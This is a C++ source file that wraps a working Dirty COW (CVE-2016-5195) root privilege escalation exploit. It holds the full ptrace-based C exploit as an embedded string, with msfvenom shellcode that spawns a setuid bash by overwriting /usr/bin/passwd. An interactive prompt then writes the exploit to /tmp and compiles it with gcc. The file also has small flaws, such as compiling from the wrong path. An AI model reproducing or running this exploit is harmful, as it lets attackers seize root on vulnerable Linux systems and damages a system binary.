#include <iostream>
#include <fstream>
#include <unistd.h>
void DirtyCowExploit(void)
{
	std::string suid_binary = """/usr/bin/passwd""";
	std::string kernelPayload = 
		/*
	* A PTRACE_POKEDATA variant of CVE-2016-5195
	* should work on RHEL 5 & 6
	* 
	* (un)comment correct payload (x86 or x64)!
	* $ gcc -pthread c0w.c  -o c0w
	* $ ./c0w
	* DirtyCow root privilege escalation
	* Backing up /usr/bin/passwd.. to /tmp/bak
	* mmap fa65a000
	* madvise 0
	* ptrace 0
	* $ /usr/bin/passwd 
	* [root@server foo]# whoami 
	* root 
	* [root@server foo]# id
	* uid=0(root) gid=501(foo) groups=501(foo)
	* @KrE80r
	*/
		"#include <fcntl.h>\n"
		"#include <pthread.h>\n"
		"#include <string.h>\n"
		"#include <stdio.h>\n"
		"#include <stdint.h>\n"
		"#include <sys/mman.h>\n"
		"#include <sys/stat.h>\n"
		"#include <sys/types.h>\n"
		"#include <sys/wait.h>\n"
		"#include <sys/ptrace.h>\n"
		"#include <unistd.h>\n"

		"int f;\n"
		"void *map;\n"
		"pid_t pid;\n"
		"pthread_t pth;\n"
		"struct stat st;\n"

		// change if no permissions to read
		"char suid_binary[] =\"/usr/bin/passwd\";\n" 

		/*
		* $ msfvenom -p linux/x64/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
		*/ 
		"unsigned char shell_code[] = {\n"
  		"0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,\n"
  		"0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,\n"
  		"0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,\n"
  		"0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n"
  		"0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,\n"
  		"0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,\n"
  		"0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,\n"
  		"0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,\n"
  		"0xb1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0x00, 0x00, 0x00,\n"
  		"0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n"
  		"0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99,\n"
  		"0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48,\n"
  		"0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8,\n"
 		"0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73,\n"
  		"0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05\n"
		"};\n"
		"unsigned int sc_len = 177;\n"

		/*
		* $ msfvenom -p linux/x86/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
		unsigned char shell_code[] = {
  		0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  		0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
  		0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  		0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,
  		0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  		0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x88, 0x00, 0x00, 0x00,
  		0xbc, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
  		0x31, 0xdb, 0x6a, 0x17, 0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52,
  		0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68,
  		0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00,
  		0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x57, 0x53,
  		0x89, 0xe1, 0xcd, 0x80
		};
		unsigned int sc_len = 136;
		*/

		"void *madviseThread(void *arg) {\n"
  		"int i,c=0;\n"
  		"for(i=0;i<200000000;i++)\n"
    		"c+=madvise(map,100,MADV_DONTNEED);\n"
  		"printf(\"madvise %d\\n\\n\",c);"
		"\n}\n"


		"int main(int argc,char *argv[]){ \n"

 		 "char *backup;\n"
 		 "printf(\"DirtyCow root privilege escalation\");\n"
 		 "printf(\"Backing up %s to /tmp/bak\", suid_binary);\n"
 		 "asprintf(&backup, \"cp %s /tmp/bak\", suid_binary);\n"
 		 "system(backup);\n"

		"f=open(suid_binary,O_RDONLY);\n"
  		"fstat(f,&st);\n"
  		"map=mmap(NULL,st.st_size+sizeof(long),PROT_READ,MAP_PRIVATE,f,0);\n"
  		"printf(\"mmap %x\\n\\n\",map);\n"
  		"pid=fork();\n"
  		"if(pid){\n"
    			"waitpid(pid,NULL,0);\n"
    			"int u,i,o,c=0,l=sc_len;\n"
    			"for(i=0;i<10000/l;i++)\n"
      				"for(o=0;o<l;o++)\n"
        				"for(u=0;u<10000;u++)\n"
          					"c+=ptrace(PTRACE_POKETEXT,pid,map+o,*((long*)(shell_code+o)));\n"
    			"printf(\"ptrace %d\\n\\n\",c);\n"
   		"}\n"
  		"else{\n"
    			"pthread_create(&pth,\n"
                 		"  NULL,\n"
                   		"madviseThread,\n"
                   		"NULL);\n"
    		"ptrace(PTRACE_TRACEME);\n"
    		"kill(getpid(),SIGSTOP);\n"
    		"pthread_join(pth,NULL);\n"
    		"}\n"
  		"return 0;\n"
		"}\n";


	putchar('\n');
	std::cout << "--------------------------------------" << std::endl;

	putchar('\n');
    std::cout << "     ~  DirtyCow Attack [CVE-2016-5195(DirtyCow) Exploit]  ~" << std::endl;
    putchar('\n');
	std::cout << "[+] ARE YOU SURE YOU WANT TO CONTINUE? [Y/N]: ";
	std::string answer;
	std::cin >> answer;
	if (answer == "Y" or answer == "y")
	{
		std::cout << "\n[+] SAVING PAYLOAD" << std::endl;
		std::ofstream outf{"/tmp/DirtyCow.c"};
		if (!outf)
		{
			std::cerr << "[!] ERROR WRITING PAYLOAD TO FILE\n" << std::endl;
			exit(EXIT_FAILURE);
		}
		else 
		{
			outf << kernelPayload;
			try
			{
					std::system("gcc -pthread DirtyCow.c -o /tmp/DirtyCow");
					std::cout << "[+] Successfully Created Exploit Payload" << std::endl;
					

			}
			catch (int a)
			{
				std::cerr << "[!] ERROR COMPILING C PAYLOAD VIA GCC" << a << std::endl;
			}

		}
	}
	else
	{
		exit(EXIT_FAILURE);
	}

	
}
